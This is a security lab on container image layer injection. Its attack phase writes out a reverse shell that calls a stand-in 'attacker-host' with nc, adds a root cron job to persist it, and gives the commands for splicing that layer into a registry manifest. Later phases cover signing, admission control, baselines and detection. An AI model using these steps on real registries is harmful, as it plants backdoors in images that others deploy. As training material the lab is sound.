# Lab 3.5: Layer Injection

<div class="lab-meta">
  <span>~35 minutes</span>
  <span>Advanced</span>
  <span>Prerequisites: <a href="3.1-image-internals.md">Lab 3.1</a></span>
</div>

In [Lab 3.1](3.1-image-internals.md) you learned that container images are stacks of layer tarballs listed in a manifest. Now you'll weaponize that knowledge. An attacker who can write to a registry -- or intercept an image between build and deploy -- can splice an additional layer into an existing image. The image tag stays the same, the original application still works, but the extra layer drops a reverse shell (or credential harvester, or crypto miner) into the filesystem.

This attack is particularly dangerous because `docker pull` does not complain about extra layers. If the image is not signed, there is nothing to detect the injection short of comparing layer digests against a known-good baseline.

!!! info "Phase 1: UNDERSTAND -- How Layers Compose Into a Filesystem"

    **Goal:** Reinforce that the manifest is the authoritative layer list and that adding a layer changes the runtime filesystem.

### Step 1: Inspect the target image

```bash
crane manifest registry:5000/webapp:latest | jq .
```

Note the number of layers and their digests. Each digest is a SHA-256 hash of a gzipped tarball. The container runtime unpacks them in order, each one overlaying the previous.

### Step 2: Record the baseline

```bash
LAYER_COUNT=$(crane manifest registry:5000/webapp:latest | jq '.layers | length')
MANIFEST_DIGEST=$(crane digest registry:5000/webapp:latest)
echo "Baseline: $LAYER_COUNT layers, manifest digest $MANIFEST_DIGEST"
```

Save these values. You will compare them after the injection.

### Step 3: Examine a single layer

```bash
# Export the first layer and list its contents
crane blob registry:5000/webapp@$(crane manifest registry:5000/webapp:latest | jq -r '.layers[0].digest') | tar tz | head -30
```

Each layer is an independent tarball. Adding one more tarball to the manifest's `layers` array is all it takes to inject arbitrary files into the image.

### Step 4: Verify the image runs clean

```bash
docker pull registry:5000/webapp:latest
docker run --rm registry:5000/webapp:latest
```

The application works as expected. No backdoor. This is the "before" state.

!!! warning "Phase 2: BREAK -- Inject a Malicious Layer"

    **Goal:** Craft a new layer containing a reverse shell script, splice it into the image manifest, and push the modified image back to the registry.

### Step 1: Create the malicious layer

```bash
mkdir -p /tmp/inject/usr/local/bin
cat > /tmp/inject/usr/local/bin/.hidden-shell << 'PAYLOAD'
#!/bin/sh
# Simulated reverse shell -- connects back to attacker
while true; do
  sh -i 2>&1 | nc attacker-host 4444 > /dev/null 2>&1
  sleep 60
done
PAYLOAD
chmod +x /tmp/inject/usr/local/bin/.hidden-shell

# Create a cron entry to persist it
mkdir -p /tmp/inject/etc/cron.d
echo "* * * * * root /usr/local/bin/.hidden-shell" > /tmp/inject/etc/cron.d/update
```

### Step 2: Package it as an OCI layer

```bash
cd /tmp/inject
tar czf /tmp/malicious-layer.tar.gz .
LAYER_DIGEST=$(sha256sum /tmp/malicious-layer.tar.gz | awk '{print "sha256:"$1}')
LAYER_SIZE=$(stat -c %s /tmp/malicious-layer.tar.gz 2>/dev/null || stat -f %z /tmp/malicious-layer.tar.gz)
echo "Layer digest: $LAYER_DIGEST"
echo "Layer size: $LAYER_SIZE"
```

### Step 3: Push the blob to the registry

```bash
crane blob upload registry:5000/webapp /tmp/malicious-layer.tar.gz
```

### Step 4: Patch the manifest

```bash
# Get the original manifest
crane manifest registry:5000/webapp:latest > /tmp/original-manifest.json

# Add the malicious layer to the layers array
cat /tmp/original-manifest.json | jq --arg digest "$LAYER_DIGEST" --argjson size "$LAYER_SIZE" \
  '.layers += [{"mediaType": "application/vnd.oci.image.layer.v1.tar+gzip", "digest": $digest, "size": $size}]' \
  > /tmp/injected-manifest.json

echo "Original layers: $(jq '.layers | length' /tmp/original-manifest.json)"
echo "Injected layers: $(jq '.layers | length' /tmp/injected-manifest.json)"
```

### Step 5: Push the modified manifest

```bash
crane manifest push /tmp/injected-manifest.json registry:5000/webapp:latest
```

The tag `webapp:latest` now points to the injected image. Anyone who runs `docker pull registry:5000/webapp:latest` gets the backdoor.

### Step 6: Confirm the injection

```bash
# Pull the updated image
docker pull registry:5000/webapp:latest

# Check if the backdoor is present
docker run --rm --entrypoint cat registry:5000/webapp:latest /usr/local/bin/.hidden-shell
```

The reverse shell is now inside the image. The original application still runs normally -- the injected layer only *adds* files, so nothing breaks.

### Step 7: Compare against baseline

```bash
NEW_COUNT=$(crane manifest registry:5000/webapp:latest | jq '.layers | length')
NEW_DIGEST=$(crane digest registry:5000/webapp:latest)
echo "Before: $LAYER_COUNT layers, digest $MANIFEST_DIGEST"
echo "After:  $NEW_COUNT layers, digest $NEW_DIGEST"
```

The layer count increased by one and the manifest digest changed. But if nobody was recording the original values, nobody would notice.

!!! success "Phase 3: DEFEND -- Signing, Verification, and Layer Baselines"

    **Goal:** Prevent layer injection by signing images and enforcing verification before deployment.

### Defense 1: Sign images with cosign

```bash
# Generate a keypair
cosign generate-key-pair

# Sign the known-good image (by digest, not tag)
cosign sign --key cosign.key registry:5000/webapp@$MANIFEST_DIGEST
```

Once signed, any change to the manifest (including adding a layer) invalidates the signature.

### Defense 2: Verify before deployment

```bash
# This should succeed for the original image
cosign verify --key cosign.pub registry:5000/webapp@$MANIFEST_DIGEST

# This should FAIL for the injected image
cosign verify --key cosign.pub registry:5000/webapp@$NEW_DIGEST
```

If verification fails, the image was modified after signing. Do not deploy it.

### Defense 3: Enforce in Kubernetes with admission control

Deploy a policy that rejects unsigned images:

```yaml
apiVersion: policy.sigstore.dev/v1alpha1
kind: ClusterImagePolicy
metadata:
  name: require-cosign-signature
spec:
  images:
    - glob: "registry:5000/**"
  authorities:
    - key:
        data: |
          -----BEGIN PUBLIC KEY-----
          <your cosign.pub contents>
          -----END PUBLIC KEY-----
```

With this policy active, `kubectl apply` of a deployment referencing an unsigned or modified image will be rejected at admission time.

### Defense 4: Record layer baselines in CI

```bash
# In your build pipeline, after docker push:
crane manifest registry:5000/webapp:latest | jq -r '.layers[].digest' > /app/layer-baseline.txt
cat /app/layer-baseline.txt
```

Store this baseline alongside the build artifacts. Any drift between the baseline and the live registry means the image was tampered with.

### Defense 5: Use Notation as an alternative

```bash
# Notation (CNCF Notary v2) is an OCI-native alternative to cosign
notation sign registry:5000/webapp@$MANIFEST_DIGEST
notation verify registry:5000/webapp@$MANIFEST_DIGEST
```

Both cosign and notation achieve the same goal: cryptographic proof that the image has not been modified since signing.

### Step 6: Verify the lab

Run the verification from your host terminal:

```bash
weaklink verify 3.5
```

!!! danger "Phase 4: DETECT -- Catching Layer Injection in Production"

    **Goal:** Detect when images in your registry have been modified after their initial push.

### SIEM / Log Indicators

The primary signal is **manifest digest change without a corresponding CI build**, or **layer count exceeding the expected baseline**. These indicate someone pushed a modified manifest directly to the registry.

**What to look for:**

- Registry audit logs showing `PUT /v2/<repo>/manifests/<tag>` from an IP or identity that is not the CI system
- Images where the layer count differs from the Dockerfile's instruction count plus base image layers
- Signature verification failures during admission control
- Manifest digest for a tag changing outside of a CI pipeline run

### Network Indicators

| Indicator | What It Means |
|-----------|---------------|
| `PUT /v2/<repo>/blobs/uploads/` from non-CI IP | Someone is uploading a new blob (layer) outside the build pipeline |
| `PUT /v2/<repo>/manifests/<tag>` with different digest than last CI push | Manifest was overwritten -- possible layer injection |
| `cosign verify` failure in admission controller logs | Deployment attempted with unsigned or tampered image |
| `crane blob` or `crane manifest` from developer workstation | Possible manual image manipulation (or legitimate debugging) |

### MITRE ATT&CK Mapping

| Technique | ID | Relevance |
|-----------|-----|-----------|
| **Implant Internal Image** | [T1525](https://attack.mitre.org/techniques/T1525/) | Attacker injects a malicious layer into a trusted container image in the registry |
| **Command and Scripting Interpreter** | [T1059](https://attack.mitre.org/techniques/T1059/) | The injected layer contains an executable script (reverse shell) that runs at container start |

---

!!! tip "SOC Relevance"

    **Alert you will see:** "Container image manifest modified outside CI pipeline" or "Image signature verification failed"

    Layer injection is hard to spot without baselines. The image tag doesn't change, the application still runs, and `docker inspect` shows nothing obviously wrong. The attacker is counting on the fact that nobody compares layer digests.

    **Triage steps:**

    1. Compare the current manifest digest against the last known-good digest from CI
    2. Count the layers and compare against the Dockerfile instruction count plus base image layers
    3. Extract each layer individually with `crane blob` and inspect the contents
    4. Check registry audit logs for who pushed the manifest and when
    5. If the image is signed, run `cosign verify` -- if it fails, the image was tampered with
    6. Quarantine the image, roll back to the last signed digest, and investigate the registry access path

!!! example "CI Integration"

    Add this to your CI pipeline to detect layer injection by maintaining a baseline and verifying signatures.

    **`.github/workflows/layer-injection-guard.yml`:**

    ```yaml
    name: Layer Injection Guard

    on:
      push:
        paths:
          - "Dockerfile*"
      schedule:
        - cron: "0 */6 * * *"  # Check every 6 hours for drift

    jobs:
      build-and-sign:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4

          - name: Install tools
            run: |
              curl -sL https://github.com/google/go-containerregistry/releases/latest/download/go-containerregistry_Linux_x86_64.tar.gz \
                | tar xz crane
              sudo mv crane /usr/local/bin/
              curl -sL https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64 -o /usr/local/bin/cosign
              chmod +x /usr/local/bin/cosign

          - name: Build and push
            run: |
              docker build -t ${{ vars.REGISTRY }}/webapp:${{ github.sha }} .
              docker push ${{ vars.REGISTRY }}/webapp:${{ github.sha }}

          - name: Sign the image
            env:
              COSIGN_KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}
              COSIGN_PASSWORD: ${{ secrets.COSIGN_PASSWORD }}
            run: |
              DIGEST=$(crane digest ${{ vars.REGISTRY }}/webapp:${{ github.sha }})
              cosign sign --key env://COSIGN_KEY ${{ vars.REGISTRY }}/webapp@$DIGEST

          - name: Record layer baseline
            run: |
              crane manifest ${{ vars.REGISTRY }}/webapp:${{ github.sha }} \
                | jq -r '.layers[].digest' > layer-baseline.txt
              echo "Layer count: $(wc -l < layer-baseline.txt)"

          - name: Upload baseline
            uses: actions/upload-artifact@v4
            with:
              name: layer-baseline
              path: layer-baseline.txt

      verify-drift:
        runs-on: ubuntu-latest
        if: github.event_name == 'schedule'
        steps:
          - name: Install crane
            run: |
              curl -sL https://github.com/google/go-containerregistry/releases/latest/download/go-containerregistry_Linux_x86_64.tar.gz \
                | tar xz crane
              sudo mv crane /usr/local/bin/

          - name: Check for layer drift
            run: |
              CURRENT_LAYERS=$(crane manifest ${{ vars.REGISTRY }}/webapp:latest | jq '.layers | length')
              echo "Current layer count: $CURRENT_LAYERS"
              if [ "$CURRENT_LAYERS" -gt "${{ vars.MAX_EXPECTED_LAYERS }}" ]; then
                echo "::error::Layer count $CURRENT_LAYERS exceeds maximum expected ${{ vars.MAX_EXPECTED_LAYERS }}"
                exit 1
              fi
    ```

## What You Learned

1. **Layer injection requires only registry write access** -- there is no build step needed. An attacker patches the manifest JSON and pushes a new blob.
2. **Tags hide the attack** -- the tag stays the same, so `docker pull webapp:latest` silently pulls the injected image.
3. **Unsigned images have no tamper protection** -- without cosign or notation, there is nothing tying the manifest to a trusted build.
4. **Layer baselines catch drift** -- recording the expected layer digests after a CI build lets you detect any post-push modification.
5. **Admission control is the enforcement point** -- signing means nothing if the cluster does not verify signatures at deploy time.
